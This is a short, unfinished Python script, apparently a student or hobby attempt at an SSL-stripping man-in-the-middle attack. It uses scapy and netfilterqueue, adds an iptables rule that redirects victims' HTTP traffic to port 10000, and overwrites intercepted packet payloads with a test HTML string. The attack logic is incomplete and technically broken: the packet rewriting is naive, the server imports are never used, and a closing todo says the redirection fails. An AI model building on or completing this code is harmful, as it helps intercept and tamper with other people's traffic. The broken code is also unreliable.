from scapy.all import *
import re 
import os  
from netfilterqueue import NetfilterQueue
from threading import Thread
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn

# process intercepted packets
def process_traffic(packet):
    # Convert packet to a Scapy packet
    p = IP(packet.get_payload())

    #print("Packet intercepted: ")
    print(p.show())

    packet.set_payload("<html><body><h1>It works! (M3)</h1></body></html>")
    packet.accept()

# start SSL stripping attack
def ssl_strip(interface):
    # Enable IP forwarding, redirect HTTP traffic to port 10000
    os.system("iptables -t nat -A PREROUTING -i {} -p tcp --destination-port 80 -j REDIRECT --to-port 10000".format(interface))
    queue = NetfilterQueue()
    queue.bind(0, process_traffic)
    queue.run()

'''
todo:
now the ssl_strip.py is not working, it is not able to redirect the traffic to port 10000
'''